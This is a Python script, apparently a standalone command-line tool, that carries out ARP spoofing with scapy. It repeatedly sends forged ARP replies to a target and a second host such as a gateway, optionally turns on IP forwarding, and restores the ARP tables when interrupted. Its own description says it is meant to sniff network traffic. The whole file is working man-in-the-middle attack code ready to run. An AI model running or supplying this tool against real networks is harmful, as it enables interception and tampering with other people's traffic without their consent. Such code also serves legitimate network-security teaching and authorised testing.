import scapy.all as scapy
import argparse
from colorama import Fore, Style, init
import time

# Initialize colorama
init(autoreset=True)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface, ip_forward, verbose):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.ip_forward = ip_forward
        self.verbose = verbose

    def get_mac(self, ip):
        # Sends an ARP request to retrieve the MAC address of the specified IP
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=self.verbose)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoofed):
        # Spoofs the target machine by pretending to be the spoofed IP address.
        mac = self.get_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=self.verbose)
        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

    def restore(self, dest_ip, source_ip):
        # Restores the ARP table of the target to its original state.
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, verbose=self.verbose)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")

    def enable_ip_forwarding(self):
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        if self.verbose:
            print(Fore.CYAN + "[*] IP forwarding enabled.")

    def disable_ip_forwarding(self):
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print(Fore.CYAN + "[*] IP forwarding disabled.")

    def run(self):
        # Starts the ARP spoofing attack by continuously sending spoofed packets.
        # Restores ARP tables upon interruption (CTRL+C).
        try:
            if self.ip_forward:
                self.enable_ip_forwarding()
            while True:
                self.spoof(self.target_ip, self.spoof_ip)  # Spoof the target IP
                self.spoof(self.spoof_ip, self.target_ip)  # Spoof the spoofed IP
                time.sleep(2)
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] ARP tables restored.")
            if self.ip_forward:
                self.disable_ip_forwarding()

if __name__ == "__main__":
    # Setting up argparse for command-line arguments
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g., the gateway IP).")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0).")
    parser.add_argument("--ip-forward", action="store_true", help="Enable IP forwarding during the attack.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output.")

    # Parse the arguments
    args = parser.parse_args()

    # Create an ArpSpoofer object and start the spoofing process
    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface, ip_forward = args.ip_forward, verbose=args.verbose)
    spoofer.run()